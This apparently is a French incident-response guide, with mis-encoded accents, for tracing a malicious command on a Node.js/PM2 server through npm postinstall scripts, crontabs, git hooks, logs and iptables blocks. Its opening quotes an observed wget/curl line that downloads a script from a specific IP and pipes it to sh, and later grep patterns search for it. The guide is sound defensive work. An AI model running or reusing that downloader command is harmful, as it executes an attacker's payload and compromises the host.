# Guide d'enqu√™te sur les malwares

Ce guide vous aide √† identifier et √©liminer la source des attaques malveillantes sur votre serveur.

## üö® Situation actuelle

Vous avez d√©tect√© des tentatives d'ex√©cution de commandes malveillantes :
```
Command failed: (wget -qO- http://178.16.52.253/1utig||curl -s http://178.16.52.253/1utig)|sh
```

L'IP `178.16.52.253` a √©t√© bloqu√©e, mais il faut identifier la source de cette commande.

## üìã √âtapes d'enqu√™te

### 1. Analyser les packages npm avec postinstall

Les scripts `postinstall` des packages npm peuvent √™tre utilis√©s pour ex√©cuter du code malveillant lors de l'installation.

```bash
# Rendre le script ex√©cutable
chmod +x deploy/analyser-packages-postinstall.sh

# Ex√©cuter l'analyse
bash deploy/analyser-packages-postinstall.sh
```

Ce script va :
- Lister tous les packages avec des scripts `postinstall`
- Afficher le contenu de chaque script
- D√©tecter les patterns suspects (wget, curl, IPs suspectes, etc.)

### 2. Diagnostic complet du syst√®me

Pour une analyse approfondie de tout le syst√®me :

```bash
# Rendre le script ex√©cutable
chmod +x deploy/diagnostic-malware-complet.sh

# Ex√©cuter le diagnostic (peut n√©cessiter sudo)
sudo bash deploy/diagnostic-malware-complet.sh
```

Ce script v√©rifie :
- ‚úÖ Processus suspects en cours
- ‚úÖ Packages npm avec postinstall
- ‚úÖ Crontabs (utilisateur, root, syst√®me)
- ‚úÖ Services systemd
- ‚úÖ Fichiers de d√©marrage (.bashrc, .bash_profile, etc.)
- ‚úÖ Fichiers r√©cemment modifi√©s
- ‚úÖ Connexions r√©seau suspectes
- ‚úÖ Logs PM2
- ‚úÖ Fichiers suspects dans le projet
- ‚úÖ Cl√©s SSH
- ‚úÖ Hooks Git
- ‚úÖ Logs syst√®me

Le rapport complet sera sauvegard√© dans `/tmp/malware-diagnostic-*.log`

### 3. V√©rifications manuelles suppl√©mentaires

#### V√©rifier les logs PM2 en d√©tail

```bash
# Voir les derni√®res erreurs
pm2 logs --lines 100 --err | grep -E "178.16.52.253|1utig|wget|curl|Command failed"

# Voir tous les logs
pm2 logs --lines 200 | grep -E "178.16.52.253|1utig"
```

#### V√©rifier les processus en temps r√©el

```bash
# Surveiller les processus
watch -n 2 'ps aux | grep -E "wget|curl|sh" | grep -v grep'

# V√©rifier les connexions r√©seau
watch -n 2 'netstat -tunap | grep ESTABLISHED'
```

#### V√©rifier les fichiers r√©cemment modifi√©s dans le projet

```bash
# Fichiers modifi√©s dans les derni√®res 24h
find ~/bbyatchv2-master -type f -mtime -1 -ls

# Fichiers modifi√©s dans les derni√®res heures
find ~/bbyatchv2-master -type f -mmin -60 -ls
```

#### V√©rifier les variables d'environnement de PM2

```bash
# Voir la configuration PM2
pm2 show bbyatch

# V√©rifier les variables d'environnement
pm2 env bbyatch | grep -E "178.16.52.253|1utig"
```

## üîç Points d'investigation prioritaires

### 1. Packages npm compromis

Si un package npm est compromis, il peut ex√©cuter du code malveillant via :
- Scripts `postinstall`
- Scripts `preinstall`
- Code dans le package lui-m√™me

**Action :** Analyser tous les packages avec `analyser-packages-postinstall.sh`

### 2. Code compromis dans le projet

Un attaquant pourrait avoir modifi√© :
- Les fichiers source du projet
- Les fichiers de configuration
- Les scripts de build

**Action :** V√©rifier les modifications Git r√©centes :
```bash
cd ~/bbyatchv2-master
git log --oneline --since="7 days ago"
git diff HEAD~10 HEAD --name-only
```

### 3. Variables d'environnement

Les variables d'environnement pourraient contenir des commandes malveillantes.

**Action :** V√©rifier le fichier `.env` :
```bash
grep -E "178.16.52.253|1utig|wget|curl" ~/bbyatchv2-master/.env
```

### 4. Hooks Git

Les hooks Git peuvent ex√©cuter du code lors des op√©rations Git.

**Action :** V√©rifier les hooks :
```bash
ls -la ~/bbyatchv2-master/.git/hooks/
cat ~/bbyatchv2-master/.git/hooks/*
```

### 5. Code inject√© dans les fichiers compil√©s

Le code malveillant pourrait √™tre dans les fichiers compil√©s (`.next/`).

**Action :** Rechercher dans les fichiers compil√©s :
```bash
grep -r "178.16.52.253" ~/bbyatchv2-master/.next/ 2>/dev/null
grep -r "1utig" ~/bbyatchv2-master/.next/ 2>/dev/null
```

## üõ°Ô∏è Actions de protection imm√©diate

### 1. Bloquer l'IP malveillante (d√©j√† fait)

```bash
# V√©rifier que l'IP est bien bloqu√©e
sudo iptables -L -n | grep 178.16.52.253

# Si ce n'est pas le cas, bloquer :
sudo iptables -A INPUT -s 178.16.52.253 -j DROP
sudo iptables -A OUTPUT -p tcp -d 178.16.52.253 -j DROP
```

### 2. Renforcer le monitoring

Le script `monitor-malware.sh` devrait d√©j√† √™tre actif. V√©rifier :

```bash
# V√©rifier que le cron est actif
crontab -l | grep monitor-malware

# V√©rifier les logs
sudo tail -50 /var/log/malware-monitor.log
```

### 3. Nettoyer et r√©installer les d√©pendances

Si un package npm est suspect :

```bash
cd ~/bbyatchv2-master

# Sauvegarder package-lock.json
cp package-lock.json package-lock.json.backup

# Supprimer node_modules
rm -rf node_modules

# Supprimer package-lock.json
rm -f package-lock.json

# R√©installer
npm install

# V√©rifier √† nouveau
bash deploy/analyser-packages-postinstall.sh
```

## üìä Interpr√©tation des r√©sultats

### Si un package npm est suspect :

1. **Identifier le package** : Notez le nom exact du package
2. **V√©rifier sa l√©gitimit√©** : Recherchez le package sur npmjs.com
3. **V√©rifier la version** : Comparez avec la version install√©e
4. **Supprimer et r√©installer** : Utilisez les commandes ci-dessus

### Si le code du projet est compromis :

1. **V√©rifier Git** : `git status` et `git diff`
2. **Restaurer depuis Git** : `git checkout -- .` (si s√ªr)
3. **Rebuild** : `npm run build`
4. **Red√©marrer PM2** : `pm2 restart bbyatch`

### Si rien n'est trouv√© :

Le malware pourrait √™tre :
- Dans un processus en m√©moire (red√©marrer le serveur)
- Dans un fichier temporaire qui se r√©g√©n√®re
- Dans un service systemd malveillant
- Dans un hook syst√®me

**Action :** Ex√©cuter le diagnostic complet et examiner le rapport.

## üîÑ Prochaines √©tapes

1. **Ex√©cuter les scripts d'analyse** (voir sections 1 et 2)
2. **Examiner les r√©sultats** attentivement
3. **Prendre des mesures correctives** selon les r√©sultats
4. **Renforcer la s√©curit√©** (voir `GUIDE-SECURISATION-SERVEUR.md`)
5. **Surveiller continuellement** avec `monitor-malware.sh`

## üìû Support

Si vous trouvez des √©l√©ments suspects mais ne savez pas comment proc√©der :
1. Sauvegarder les logs : `cp /tmp/malware-diagnostic-*.log ~/`
2. Noter les packages suspects
3. Documenter les fichiers modifi√©s
4. Demander de l'aide avec ces informations
